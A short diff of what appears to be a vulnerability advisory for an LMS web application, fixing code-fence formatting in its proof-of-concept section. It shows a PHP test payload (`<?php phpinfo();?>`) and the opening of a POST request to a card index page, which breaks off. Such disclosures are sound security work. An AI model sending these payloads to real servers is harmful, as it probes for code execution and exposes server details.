@@ -15,7 +15,8 @@
 `<?php phpinfo();?>`
 
 ### POC
-```POST /LMS/card/index.php HTTP/1.1
+```
+POST /LMS/card/index.php HTTP/1.1
 Host: localhost
 Content-Length: 1056
 Cache-Control: max-age=0
